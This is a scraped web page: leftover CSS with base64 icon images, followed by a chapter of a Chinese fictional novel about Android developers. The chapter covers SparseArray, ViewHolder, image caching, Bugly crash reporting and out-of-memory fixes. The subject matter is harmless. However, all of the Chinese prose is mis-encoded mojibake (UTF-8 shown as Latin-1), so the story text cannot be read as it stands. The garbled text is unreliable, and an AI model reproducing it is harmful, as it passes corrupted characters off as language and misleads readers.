input[type=checkbox]:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04NzcuMDU2IDE0Ni45NDR2NzMwLjExMkgxNDYuOTQ0VjE0Ni45NDRoNzMwLjExMnptMC0xMDQuMjc3SDE0Ni45NDRjLTU3LjYyOCAwLTEwNC4yNzcgNDYuNjQ5LTEwNC4yNzcgMTA0LjI3N3Y3MzAuMTEyYzAgNTcuNjI4IDQ2LjY0OSAxMDQuMjc3IDEwNC4yNzcgMTA0LjI3N2g3MzAuMTEyYzU3LjYyOCAwIDEwNC4yNzctNDYuNjQ5IDEwNC4yNzctMTA0LjI3N1YxNDYuOTQ0YzAtNTcuNjI4LTQ2LjY0OS0xMDQuMjc3LTEwNC4yNzctMTA0LjI3N3oiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}.markdown-body input[type=checkbox]:checked:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTUiIGhlaWdodD0iMTUiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik05MTAuMjA4IDBIMTEzLjc2QTExNC4xMTIgMTE0LjExMiAwIDAwLS4wMzIgMTEzLjc5MlY5MTAuMjRjMCA2Mi41OTIgNTEuMiAxMTMuNzkyIDExMy43OTIgMTEzLjc5Mmg3OTYuNDQ4YzYyLjU5MiAwIDExMy43OTItNTEuMiAxMTMuNzkyLTExMy43OTJWMTEzLjc5MkMxMDI0IDUxLjIgOTcyLjggMCA5MTAuMjA4IDB6bS01MTIgNzk2LjQ0OEwxMTMuNzYgNTEybDc5LjY0OC03OS42NDggMjA0LjggMjA0LjhMODMwLjU2IDIwNC44bDc5LjY0OCA3OS42NDgtNTEyIDUxMnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="xcode">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#000}.xml .hljs-meta{color:silver}.hljs-comment,.hljs-quote{color:#007400}.hljs-attribute,.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-tag{color:#aa0d91}.hljs-template-variable,.hljs-variable{color:#3f6e74}.hljs-code,.hljs-meta-string,.hljs-string{color:#c41a16}.hljs-link,.hljs-regexp{color:#0e0eff}.hljs-bullet,.hljs-number,.hljs-symbol,.hljs-title{color:#1c00cf}.hljs-meta,.hljs-section{color:#643820}.hljs-built_in,.hljs-builtin-name,.hljs-class .hljs-title,.hljs-params,.hljs-type{color:#5c2699}.hljs-attr{color:#836c28}.hljs-subst{color:#000}.hljs-formula{background-color:#eee;font-style:italic}.hljs-addition{background-color:#baeeba}.hljs-deletion{background-color:#ffc8bd}.hljs-selector-class,.hljs-selector-id{color:#9b703f}.hljs-doctag,.hljs-strong{font-weight:700}.hljs-emphasis{font-style:italic}</style><p>æœ¬ç³»åˆ—ä¸º Android æŠ€æœ¯èŒåœºé¢˜æè™šæ„å°è¯´ï¼Œæ‰€æœ‰ç™»åœºäººç‰©ã€å…¬å¸åç§°ã€ç»„ç»‡æ¶æ„åŠç›¸å…³æƒ…èŠ‚å‡ä¸ºåˆ›ä½œæ‰€éœ€è™šæ„è€Œæ¥ï¼Œè‹¥æœ‰é›·åŒï¼Œçº¯å±å¶ç„¶ã€‚ä¹¦ä¸­æ¶‰åŠçš„æŠ€æœ¯çŸ¥è¯†ç»ä¸“ä¸šæ¢³ç†ï¼Œä»…ä¾›å‚è€ƒã€‚</p>
<h2 data-id="heading-0">ä¸ƒï¼‰è°ƒè¯•é‡‡å‘ç£¨é”‹èŠ’ ä¸´æ—¶è½¬å²—è«æ…Œå¼ </h2>
<p>æ¸…æ™¨çš„é˜³å…‰åˆšæ¼«è¿‡è¥¿äºŒæ——çš„å†™å­—æ¥¼ç»ç’ƒå¹•å¢™ã€‚</p>
<p>åŠå…¬åŒºè¿˜æ²¡å®Œå…¨çƒ­é—¹èµ·æ¥ï¼Œæ™“é›…ã€é˜¿æ³½å’Œåšæ–‡ä¸‰ä¸ªå®ä¹ ç”Ÿå°±ç°‡æ‹¥ç€å›´åœ¨äº†è€æ¨çš„å·¥ä½æ—ã€‚</p>
<p>ä¸‰äººæ‰‹é‡Œéƒ½æ§ç€ç¬”è®°æœ¬ç”µè„‘ï¼Œå±å¹•ä¸Šå…¨æ˜¯æ˜¨æ™šèµ¶å·¥çš„ä»£ç ç•Œé¢ã€‚</p>
<p>å°å®‰åˆ™ç«™åœ¨ä¸€æ—ï¼ŒåŒæ‰‹äº¤æ¡åœ¨èº«å‰ï¼Œçœ¼ç¥é‡Œæ»¡æ˜¯æ©é¥°ä¸ä½çš„ç„¦è™‘ã€‚</p>
<p>"æ¨å“¥æ¨å“¥ï¼Œä½ å¸®æˆ‘ä»¬çœ‹çœ‹è¿™ä¸ªï¼"</p>
<p>é˜¿æ³½ç‡å…ˆæŠŠç”µè„‘å‡‘åˆ°è€æ¨é¢å‰ï¼Œè¯­æ°”é‡Œå¸¦ç€ç‚¹æ€¥åˆ‡ã€‚</p>
<p>â€œè¿™æ˜¯æ—å“¥ä¸´èµ°å‰ç»™æˆ‘ä»¬å¸ƒç½®çš„éŸ³ä¹æ’­æ”¾åŠŸèƒ½ç»ƒä¹ ï¼Œæˆ‘æ‰“ç®—ç”¨ <code>SparseArray</code> ä¼˜åŒ–æ•°æ®å­˜å‚¨ï¼Œä»¥ <code>int</code> å­˜æ­Œæ›²IDå½“é”®ï¼Œå¯¹åº”å­˜å‚¨å€¼å°±æ˜¯æ­Œæ›²åã€æ­Œæ‰‹ã€æ’­æ”¾æ—¶é•¿è¿™äº›ä¿¡æ¯çš„ <code>Song</code> å¯¹è±¡ï¼Œéå†çš„æ—¶å€™ç”¨äº† <code>keyAt</code> å’Œ <code>valueAt</code> æ–¹æ³•è·å–å¯¹åº”æ•°æ®ï¼Œä½ çœ‹è¿™æ€è·¯å¯¹ä¸å¯¹ï¼Ÿ"</p>
<p>è€æ¨æ‰¶äº†æ‰¶çœ¼é•œï¼ŒæŒ‡å°–åœ¨é˜¿æ³½çš„è§¦æ§æ¿ä¸Šæ…¢æ…¢æ»‘åŠ¨ï¼Œç›®å…‰æ‰«è¿‡ä»£ç ã€‚</p>
<p>"å—¯ï¼Œæ€è·¯æ²¡é—®é¢˜ã€‚"</p>
<p>ä»–é¡¿äº†é¡¿ï¼Œç»§ç»­è¯´é“ï¼š"æŠŠæ­Œæ›²IDå’Œ <code>Song</code> å¯¹è±¡ç”¨ <code>SparseArray</code> æ˜ å°„ï¼Œæ¯”ç”¨ <code>HashMap</code> å­˜æ•´æ•°é”®çœå†…å­˜ï¼Œè¿˜èƒ½é¿å…è‡ªåŠ¨è£…ç®±ã€‚"</p>
<p>è€æ¨å¿½ç„¶åœåœ¨ä¸€æ®µéå†ä»£ç ä¸Šï¼ŒæŠ¬çœ¼çœ‹å‘ä¸‰äººã€‚</p>
<p>"ä½ ä»¬çœ‹è¿™é‡Œï¼Œé˜¿æ³½ç”¨<code>size()</code> åšå¾ªç¯è¾¹ç•Œçš„æ—¶å€™ï¼Œæ¯æ¬¡å¾ªç¯éƒ½è°ƒç”¨äº†ä¸€æ¬¡ <code>size()</code> æ–¹æ³•ã€‚"</p>
<p>"å¯ä»¥ä¼˜åŒ–ä¸‹ï¼Œå…ˆæŠŠ <code>size</code> å­˜æˆå±€éƒ¨å˜é‡å†å¾ªç¯ï¼Œå‡å°‘æ–¹æ³•è°ƒç”¨å¼€é”€ã€‚"</p>
<p>è€æ¨è¯éŸ³åˆšè½ï¼Œä¸€æ—çš„å°å®‰è½»è½»å’³å—½äº†ä¸¤å£°ï¼Œæ‰“æ–­äº†å‡ äººçš„è®¨è®ºã€‚</p>
<p>"æ¨å“¥ï¼Œæ‰“æ‰°ä¸€ä¸‹..."</p>
<p>"æ—å“ä»–æ˜¨å¤©è¢«å¼ ç£Šå«èµ°æ”¯æ´ç´§æ€¥é¡¹ç›®ï¼Œæˆ‘é—®ä»–ä»–ä¹Ÿè¯´ä¸å‡ºä¸ªæ‰€ä»¥ç„¶ï¼Œä½ è¯´ä¼šä¸ä¼šæ˜¯å‡ºä»€ä¹ˆäº‹äº†ï¼Ÿ"</p>
<p>è€æ¨æ•²é”®ç›˜çš„æ‰‹æŒ‡é¡¿äº†é¡¿ã€‚</p>
<p>ä»–è½¬èº«ä»æŠ½å±‰é‡Œæ‘¸å‡ºè¢‹é€Ÿæº¶å’–å•¡ã€‚</p>
<p>çƒ­æ°´å†²è¿›æªç“·æ¯çš„ç¬é—´ï¼Œæ°¤æ°²çš„çƒ­æ°”æ¨¡ç³Šäº†é•œç‰‡ã€‚</p>
<p>ä»–çš„ç›®å…‰ä¹Ÿéšä¹‹é£˜è¿œâ€”â€”é‚£é‡Œä»¿ä½›æµ®ç°å‡ºåå‡ å¹´å‰ä¸­å…³æ‘è½¯ä»¶å›­çš„æ¨¡æ ·ï¼Œç°æ‰‘æ‰‘çš„å†™å­—æ¥¼å¤–ï¼Œæ»¡æ˜¯æŠ±ç€ç”µè„‘å¥”æ³¢çš„å¹´è½»äººã€‚</p>
<p>è€Œä»–è‡ªå·±ï¼Œæ­£ç¼©åœ¨æ·˜ä¸€æ·˜æŠ€æœ¯éƒ¨çš„è§’è½å·¥ä½é‡Œï¼Œå¿å¿‘åœ°ç­‰å¾…ç€å…¥èŒåçš„ç¬¬ä¸€æ¬¡ä»»åŠ¡åˆ†é…ã€‚</p>
<p>"è¿™åœ¨å¤§å‚å†æ­£å¸¸ä¸è¿‡ã€‚"</p>
<p>è€æ¨çš„å£°éŸ³å¸¦ç€å‡ åˆ†æ‚ è¿œã€‚</p>
<p>"æˆ‘åˆšå…¥èŒæ·˜ä¸€æ·˜é‚£å¹´ï¼Œæ¯”æ—å“ç°åœ¨è¿˜æ…Œã€‚å…¥èŒç¬¬ä¸‰å¤©å°±è¢«æ‹‰å»æ•‘æ€¥ï¼Œè¿å…¬å¸èŒ¶æ°´é—´åœ¨å“ªéƒ½æ²¡æ‘¸æ¸…ã€‚"</p>
<p>åšæ–‡æ¨äº†æ¨é¼»æ¢ä¸Šçš„çœ¼é•œã€‚</p>
<p>ä»–çœ¼ç¥é‡Œæ»¡æ˜¯å¥½å¥‡ï¼š"æ¨å“¥ï¼Œä½ å½“å¹´åˆšå…¥èŒçš„æ—¶å€™ï¼Œä¹Ÿé‡åˆ°è¿‡è¿™ç§çªç„¶è¢«æ‹‰å»æ”¯æ´ç´§æ€¥é¡¹ç›®çš„æƒ…å†µå—ï¼Ÿ"</p>
<p>è€æ¨æŠ¿äº†å£çƒ­å’–å•¡ã€‚</p>
<p>è‹¦æ¶©çš„å‘³é“å”¤é†’äº†å°˜å°çš„è®°å¿†ã€‚</p>
<p>......</p>
<p>æ—¶é—´å›åˆ°åå¹´å‰ï¼Œè€æ¨å…¥èŒç¬¬ä¸‰å¤©ã€‚</p>
<p>......</p>
<p>é‚£å¹´çš„å¤å¤©æ ¼å¤–é—·çƒ­ï¼Œæ·˜ä¸€æ·˜æŠ€æœ¯éƒ¨çš„ç©ºè°ƒåäº†ä¸¤å°ï¼Œå‰©ä¸‹çš„ä¸¤å°æ ¹æœ¬å‹ä¸ä½æ»¡å±‹å­ç”µè„‘æ•£å‘çš„çƒ­æ°”ã€‚</p>
<p>æ¯ä¸ªäººçš„å·¥ä½æ—éƒ½æ”¾ç€ä¸€ç“¶å†°é•‡çŸ¿æ³‰æ°´ï¼Œé”®ç›˜ä¸Šå¶å°”è¿˜èƒ½çœ‹åˆ°æ°´ç æ»‘è½çš„ç—•è¿¹ã€‚</p>
<p>"æ¨æ˜ï¼Œè¿‡æ¥ä¸€ä¸‹ã€‚"</p>
<p>æŠ€æœ¯æ€»ç›‘ç‹å“¥çš„å£°éŸ³åœ¨å˜ˆæ‚çš„åŠå…¬åŒºé‡Œæ ¼å¤–æ¸…æ™°ã€‚</p>
<p>è€æ¨å½“æ—¶è¿˜å«æœ¬åï¼Œå¬åˆ°å¬å”¤ç«‹åˆ»ä»å·¥ä½ä¸Šå¼¹èµ·æ¥ã€‚</p>
<p>ä»–æ‰‹é‡Œè¿˜æ”¥ç€åˆšæ‰“å°çš„å…¬å¸ Android ç¼–ç è§„èŒƒæ–‡æ¡£ã€‚</p>
<p>ç‹å“¥çš„å·¥ä½åœ¨åŠå…¬åŒºæœ€å†…ä¾§ï¼Œå‘¨å›´å †ç€åšåšçš„é¡¹ç›®èµ„æ–™ã€‚</p>
<p>å±å¹•ä¸Šæ­£æ˜¾ç¤ºç€ä¸€æ®µå¡é¡¿çš„åˆ—è¡¨åŠ¨ç”»â€”â€”æ·˜ä¸€æ·˜çš„å•†å“åˆ—è¡¨é¡µï¼Œæ»‘åŠ¨æ—¶åƒè¢«æŒ‰äº†æ…¢æ”¾é”®ï¼Œæ¯æ»‘ä¸‰è¡Œå°±ä¼šé¡¿ä¸€ä¸‹ã€‚</p>
<p>æµ‹è¯•æœºçš„çŠ¶æ€æ é‡Œï¼Œå†…å­˜å ç”¨æ•°å­—è¿˜åœ¨ä¸æ–­æ”€å‡ã€‚</p>
<p>"ç”¨æˆ·åé¦ˆç‚¸äº†ï¼Œ"</p>
<p>ç‹å“¥æ‰ç€é€šçº¢çš„çœ¼ç›ï¼ŒæŠŠæµ‹è¯•æœºæ‰”ç»™è€æ¨ã€‚</p>
<p>"ä½å†…å­˜æœºå‹ä¸Šå°¤å…¶æ˜æ˜¾ï¼Œä½ å»å®‰å“ç»„æ”¯æ´ï¼Œå…ˆæŠŠè¿™ä¸ªå¡é¡¿é—®é¢˜è§£å†³äº†ã€‚"</p>
<p>ä»–é¡¿äº†é¡¿ï¼Œè¡¥å……é“ï¼š"å®‰å“ç»„çš„äººéƒ½è¢«æ‹‰å»åšåŒåä¸€é¢„çƒ­æ´»åŠ¨äº†ï¼Œè¿™ä¸ªå‘ä½ å…ˆå¡«ä¸Šã€‚"</p>
<p>è€æ¨æ¥è¿‡æµ‹è¯•æœºï¼Œæ‰‹æŒ‡éƒ½åœ¨å‘é¢¤ã€‚</p>
<p>ä»–å¤§å­¦æœŸé—´è™½ç„¶å­¦è¿‡ Android å¼€å‘ï¼Œä½†éƒ½æ˜¯åšäº›ç®€å•çš„<code>Demo</code>ï¼Œå“ªé‡Œæ¥è§¦è¿‡çœŸå®çš„ç”Ÿäº§ç¯å¢ƒä»£ç ã€‚</p>
<p>æ‰“å¼€é¡¹ç›®å·¥ç¨‹çš„ç¬é—´ï¼Œä»–å·®ç‚¹è¢«æ»¡å±çš„çº¢è‰²è­¦å‘Šå“ä½ã€‚</p>
<p>å…‰æ˜¯å•†å“åˆ—è¡¨é€‚é…å™¨çš„ä»£ç ï¼Œå°±æœ‰è¶³è¶³ä¸‰ç™¾å¤šè¡Œï¼Œé‡Œé¢å…¨æ˜¯ <code>HashMap&lt;Integer, View&gt;</code> çš„ç”¨æ³•ï¼Œå¾ªç¯é‡Œè¿˜åµŒå¥—ç€å¤šæ¬¡ <code>findViewById</code>ã€‚</p>
<p>ç‹å“¥æ­£åœ¨æ¥ç”µè¯ã€‚</p>
<p>æŒ‚äº†ç”µè¯ï¼Œä»–çœ‹åˆ°è€æ¨ç›¯ç€ <code>HashMap</code> å‘å‘†ï¼Œçªç„¶ç¬‘äº†ã€‚</p>
<p>"åˆšæ¯•ä¸šçš„å§ï¼Ÿ"</p>
<p>ç‹å“¥çœ‹äº†çœ¼å±å¹•ä¸Šçš„ä»£ç ï¼Œåˆçœ‹äº†çœ‹è€æ¨ï¼Œè¯­æ°”ç¼“å’Œäº†äº›ï¼š"è¿™ä»£ç æ˜¯å‰äººé—ç•™çš„å‘ï¼Œç”¨ <code>HashMap</code> å­˜æ•´æ•°é”®ï¼Œæ—¢è´¹å†…å­˜åˆå®¹æ˜“å‡ºé—®é¢˜ï¼Œä½ æ¥æ‰‹äº†å¯å¾—å¥½å¥½æ¢³ç†ä¸‹ã€‚"</p>
<p>è€æ¨æ¶¨çº¢äº†è„¸ï¼Œèµ¶ç´§çœ‹ Android å®˜æ–¹æ–‡æ¡£ã€‚</p>
<p>ç‹å“¥èµ°è¿‡æ¥ï¼Œæœç´¢äº†ä¸€ä¸‹æ–‡æ¡£é‡Œçš„ <code>SparseArray</code> è¯´æ˜ã€‚</p>
<p>"çœ‹è¿™ä¸ªï¼Œä¸“é—¨ç”¨äº <code>int</code> é”®å’Œ <code>Object</code> å€¼çš„æ˜ å°„ï¼Œæ¯” <code>HashMap</code> çœå†…å­˜ï¼Œè¿˜ä¸ç”¨è‡ªåŠ¨è£…ç®±ã€‚"</p>
<p>ä»–éšæ‰‹åœ¨è‰ç¨¿çº¸ä¸Šç”»äº†ä¸ªç¤ºæ„å›¾ã€‚</p>
<p>"ä½ æŠŠè¿™é‡Œçš„ <code>HashMap</code> å…¨æ¢æˆ <code>SparseArray</code>ï¼Œå†æŠŠ <code>ViewHolder</code> åŠ ä¸Šå‡å°‘ <code>findViewById</code> æ¬¡æ•°ï¼Œåº”è¯¥èƒ½ç¼“è§£å¡é¡¿ã€‚"</p>
<p>é‚£å¤©æ™šä¸Šï¼Œè€æ¨åœ¨å…¬å¸å¾…åˆ°äº†å‡Œæ™¨ä¸¤ç‚¹ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09729562590f4f63858cf5fbc63d4e04~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767659412&amp;x-signature=jDeRChB9lHt4vrfL1cA3Pmujwpc%3D" alt="1.png" loading="lazy"/></p>
<p>åŠå…¬åŒºé‡Œåªå‰©ä¸‹ä»–ä¸€ä¸ªäººï¼Œç©ºè°ƒçš„å—¡å—¡å£°æ ¼å¤–æ¸…æ™°ã€‚</p>
<p>ä»–æŒ‰ç…§ç‹å“¥çš„æç¤ºï¼Œä¸€æ­¥æ­¥é‡æ„ä»£ç ã€‚</p>
<p>å…ˆå®šä¹‰ <code>ViewHolder</code> ç±»ï¼ŒæŠŠå•†å“åç§°ã€ä»·æ ¼ã€å›¾ç‰‡ç­‰æ§ä»¶éƒ½å°è£…è¿›å»ã€‚</p>
<p>å†æŠŠ <code>HashMap&lt;Integer, View&gt;</code> æ›¿æ¢æˆ <code>SparseArray&lt;View&gt;</code>ï¼Œéå†çš„æ—¶å€™ç”¨ <code>keyAt(i)</code> è·å–é”®ï¼Œ<code>valueAt(i)</code> è·å–å¯¹åº”çš„ <code>ViewHolder</code>ã€‚</p>
<p>è°ƒè¯•çš„è¿‡ç¨‹å¹¶ä¸é¡ºåˆ©ã€‚</p>
<p>ç¬¬ä¸€æ¬¡è¿è¡Œæ—¶ï¼Œå•†å“å›¾ç‰‡å…¨å˜æˆäº†é—®å·ã€‚</p>
<p><strong>Logcat</strong> é‡ŒæŠ¥å‡ºç©ºæŒ‡é’ˆå¼‚å¸¸ã€‚</p>
<p>è€æ¨æ’æŸ¥äº†åŠå¤©ï¼Œæ‰å‘ç°æ˜¯è‡ªå·±åœ¨ <code>delete</code> å…ƒç´ åï¼Œæ²¡æœ‰åŠæ—¶æ›´æ–°åˆ—è¡¨çš„æ•°æ®æºï¼Œå¯¼è‡´å¤ç”¨<code>ViewHolder</code> æ—¶å‡ºç°äº†æ•°æ®é”™ä¹±ã€‚</p>
<p>å…¶å®å•é æŠŠ <code>HashMap</code> æ¢æˆ <code>SparseArray</code>ï¼Œåªèƒ½è§£å†³éƒ¨åˆ†å†…å­˜å ç”¨é—®é¢˜ï¼Œæƒ³è®©åˆ—è¡¨å½»åº•é¡ºæ»‘ï¼Œè¿˜å¾—é…å¥—ä¼˜åŒ–å…¶ä»–ç¯èŠ‚ã€‚</p>
<p>è€æ¨åç»­åˆè¡¥å……äº†å›¾ç‰‡ç¼“å­˜ç­–ç•¥ï¼Œç”¨ <code>LruCache</code> ç¼“å­˜å·²åŠ è½½çš„å•†å“å›¾ç‰‡ï¼Œé¿å…é‡å¤è¯·æ±‚ç½‘ç»œï¼›åŒæ—¶æŠŠåˆ—è¡¨é¡¹çš„å›¾ç‰‡åŠ è½½æ”¹æˆå¼‚æ­¥è¯·æ±‚ï¼Œä¸è®©è€—æ—¶æ“ä½œé˜»å¡ä¸»çº¿ç¨‹ã€‚</p>
<p>ä¿®æ”¹å®Œæˆåï¼Œä»–å†æ¬¡è¿è¡Œé¡¹ç›®ã€‚</p>
<p>åŸæœ¬æ»‘åŠ¨å¡é¡¿çš„åˆ—è¡¨ï¼Œç«Ÿç„¶èƒ½æµç•…åœ°æ»‘åˆ°åº•éƒ¨ã€‚</p>
<p><code>Memory Monitor</code> é‡Œçš„å†…å­˜æ›²çº¿ä¹Ÿä»é”¯é½¿çŠ¶å˜æˆäº†å¹³ç¼“çš„æ³¢æµªã€‚</p>
<p>ç¬¬äºŒå¤©ä¸­åˆï¼Œè€æ¨åˆšåˆ°å…¬å¸ï¼Œå°±æŠŠä¼˜åŒ–åçš„ä»£ç æäº¤åˆ°ä»£ç ä»“åº“ï¼Œå¿ƒé‡Œæ»¡æ˜¯æˆå°±æ„Ÿã€‚</p>
<p>å¯è¿˜æ²¡ç­‰ä»–å–˜å£æ°”ï¼Œæµ‹è¯•ç»„åŒäº‹æŠ±ç€ä¸€å †æµ‹è¯•æœºå†²è¿‡æ¥ï¼Œè„¸è‰²é“é’ã€‚</p>
<p>"æ¨æ˜ï¼Œä½ ä¼˜åŒ–åçš„ç‰ˆæœ¬åœ¨éƒ¨åˆ†æœºå‹ä¸Šé¢‘ç¹é—ªé€€ï¼Œåå°å·²ç»æ”¶åˆ°ä¸Šç™¾æ¡å´©æºƒæŠ¥å‘Šäº†ï¼"</p>
<p>è€æ¨çš„å¿ƒä¸€ä¸‹å­æ²‰åˆ°äº†è°·åº•ã€‚</p>
<p>ä»–èµ¶ç´§è¿æ¥ç”µè„‘ï¼Œæ‰“å¼€ <strong>Logcat</strong> ç­›é€‰å´©æºƒæ—¥å¿—ã€‚</p>
<p>å¯†å¯†éº»éº»çš„çº¢è‰²æ—¥å¿—é‡Œï¼Œ"OutOfMemoryError" å­—æ ·æ ¼å¤–åˆºçœ¼ã€‚</p>
<p>éƒ¨åˆ†ä½å†…å­˜æœºå‹ä¸Šï¼Œå•†å“å›¾ç‰‡çš„ <code>Bitmap</code> å¯¹è±¡æœªåŠæ—¶å›æ”¶ï¼Œå åŠ  <code>SparseArray</code> ä¼˜åŒ–åæœªé€‚é…çš„ç¼“å­˜é€»è¾‘ï¼Œæœ€ç»ˆå¯¼è‡´å†…å­˜æº¢å‡ºã€‚</p>
<p>æ›´æ£˜æ‰‹çš„æ˜¯ï¼Œæœ‰äº›å´©æºƒæ—¥å¿—åªæ˜¾ç¤ºå¼‚å¸¸ç±»å‹ï¼Œå´æ‰¾ä¸åˆ°å…·ä½“ä»£ç è°ƒç”¨è·¯å¾„ï¼Œæ ¹æœ¬æ— ä»ä¸‹æ‰‹æ’æŸ¥ã€‚</p>
<p>"æ…Œä»€ä¹ˆï¼Ÿå…ˆæŠŠå´©æºƒæ—¥å¿—ç†æ¸…æ¥šã€‚"</p>
<p>ç‹å“¥ä¸çŸ¥ä½•æ—¶ç«™åˆ°äº†ä»–èº«åï¼ŒæŒ‡ç€ <strong>Logcat</strong> ç•Œé¢ã€‚</p>
<p>"å¼€å‘ç¯å¢ƒç”¨ <strong>Logcat</strong> æŸ¥å³æ—¶æ—¥å¿—ï¼Œç”Ÿäº§ç¯å¢ƒçš„å´©æºƒå¾—é ä¸“é—¨çš„ç›‘æ§å·¥å…·ã€‚"</p>
<p>"å’±ä»¬å…¬å¸åˆšæ¥å…¥äº† <strong>Bugly</strong>ï¼Œä½ æŠŠå®ƒé›†æˆåˆ°é¡¹ç›®é‡Œï¼Œèƒ½è·å–å®Œæ•´çš„å †æ ˆä¿¡æ¯ã€è®¾å¤‡å‹å·å’Œç”¨æˆ·è¡Œä¸ºè·¯å¾„ï¼Œå®šä½é—®é¢˜ä¼šå¿«å¾ˆå¤šã€‚"</p>
<p>ä»–é¡¿äº†é¡¿ï¼Œè¡¥å……é“ï¼š"å¯¹äº†ï¼Œè®°å¾—åŒºåˆ†ç”Ÿäº§å’Œæµ‹è¯•ç¯å¢ƒçš„é…ç½®ï¼Œåˆ«æŠŠæµ‹è¯•ç¯å¢ƒçš„æ—¥å¿—å’ŒæœåŠ¡å™¨è¯·æ±‚å¼„åˆ°ç”Ÿäº§ç¯å¢ƒå»äº†ã€‚"</p>
<p>è€æ¨èµ¶ç´§æŒ‰ç…§ç‹å“¥çš„æŒ‡å¯¼é›†æˆ <strong>Bugly</strong>ï¼ŒåŒæ—¶ç¢ç£¨èµ·ç¯å¢ƒåŒºåˆ†çš„é—®é¢˜ã€‚</p>
<p>ä»–åœ¨ <code>build.gradle</code> é‡Œé…ç½®äº† <code>buildTypes</code>ï¼Œåˆ†åˆ«å®šä¹‰ <code>debug</code>ï¼ˆæµ‹è¯•ç¯å¢ƒï¼‰å’Œ <code>release</code>ï¼ˆç”Ÿäº§ç¯å¢ƒï¼‰ä¸¤ç§æ„å»ºç±»å‹ã€‚</p>
<p>æµ‹è¯•ç¯å¢ƒä¸‹ï¼Œå¼€å¯ <code>Log</code> æ—¥å¿—è¾“å‡ºï¼Œå°† <strong>Bugly</strong> è®¾ç½®ä¸ºè°ƒè¯•æ¨¡å¼ï¼ŒæœåŠ¡å™¨è¯·æ±‚æŒ‡å‘æµ‹è¯•æœåŠ¡å™¨ã€‚</p>
<p>ç”Ÿäº§ç¯å¢ƒä¸‹ï¼Œå…³é—­æ‰€æœ‰è°ƒè¯•æ—¥å¿—ï¼Œ<strong>Bugly</strong> åˆ‡æ¢ä¸ºæ­£å¼ç›‘æ§æ¨¡å¼ï¼Œè¯·æ±‚æ­£å¼æœåŠ¡å™¨åœ°å€ã€‚</p>
<p>ä¸ºäº†é¿å…æ‰‹åŠ¨ä¿®æ”¹å‡ºé”™ï¼Œä»–è¿˜é€šè¿‡ <code>BuildConfig</code> ç±»è·å–ç¯å¢ƒå˜é‡ï¼Œæ¯”å¦‚ç”¨ <code>BuildConfig.DEBUG</code> åˆ¤æ–­å½“å‰ç¯å¢ƒï¼Œç”¨ <code>BuildConfig.BASE_URL</code> è·å–å¯¹åº”ç¯å¢ƒçš„æœåŠ¡å™¨åœ°å€ã€‚</p>
<p>é…ç½®å®Œæˆåï¼Œä»–åœ¨ä»£ç å…³é”®ä½ç½®æ·»åŠ äº† <code>try-catch</code> å—æ•è·å¼‚å¸¸ï¼Œå¹¶æ ¹æ®ç¯å¢ƒè¾“å‡ºæ—¥å¿—ã€‚</p>
<p>æ²¡è¿‡å¤šä¹…ï¼Œ<strong>Bugly</strong> åå°å°±ç»Ÿè®¡å‡ºè¯¦ç»†çš„å´©æºƒæŠ¥å‘Šã€‚</p>
<p>å´©æºƒå‘ç”Ÿåœ¨å•†å“åˆ—è¡¨ä¸€ç›´æ»‘åŠ¨åŠ è½½å›¾ç‰‡çš„åœºæ™¯ã€‚</p>
<p>ç»“åˆæŠ¥å‘Šé‡Œçš„å †æ ˆä¿¡æ¯ï¼Œä»–å¾ˆå¿«æ‰¾åˆ°äº†é—®é¢˜æ ¹æºâ€”â€”å›¾ç‰‡ç¼“å­˜æ²¡æœ‰è®¾ç½®å¤§å°ä¸Šé™ï¼Œä¹Ÿæ²¡æœ‰ç›‘å¬ç³»ç»Ÿä½å†…å­˜çŠ¶æ€ã€‚</p>
<p>"ç”¨ <code>ActivityManager</code> çš„ <code>getMemoryInfo</code> æ–¹æ³•åˆ¤æ–­è®¾å¤‡å†…å­˜çŠ¶æ€ã€‚"</p>
<p>ç‹å“¥æ‰”ç»™ä»–ä¸€ä¸ªä»£ç ç¤ºä¾‹ã€‚</p>
<p>"å½“è®¾å¤‡å¤„äºä½å†…å­˜çŠ¶æ€æ—¶ï¼Œä¸»åŠ¨æ¸…ç†å›¾ç‰‡ç¼“å­˜å’Œ <code>SparseArray</code> é‡Œçš„é—²ç½®æ•°æ®ã€‚"</p>
<p>"å¦å¤–ï¼Œç»™çº¿ç¨‹åŠ ä¸ªå…¨å±€å¼‚å¸¸å¤„ç†å™¨ï¼Œé¿å…æœªæ•è·çš„å¼‚å¸¸ç›´æ¥å¯¼è‡´åº”ç”¨å´©æºƒã€‚"</p>
<p>è€æ¨ç…§ç€ä¿®æ”¹ä»£ç ã€‚</p>
<p>ä»–é€šè¿‡ <code>Thread.setDefaultUncaughtExceptionHandler</code> è®¾ç½®äº†å…¨å±€å¼‚å¸¸å¤„ç†å™¨ï¼Œåœ¨é‡Œé¢è®°å½•å¼‚å¸¸è¯¦æƒ…å¹¶å‹å¥½é€€å‡ºåº”ç”¨ã€‚</p>
<p>åŒæ—¶ç”¨ <code>ActivityManager</code> ç›‘æ§å†…å­˜ï¼Œä½å†…å­˜æ—¶è°ƒç”¨ <code>sparseArray.clear()</code> é‡Šæ”¾èµ„æºã€‚</p>
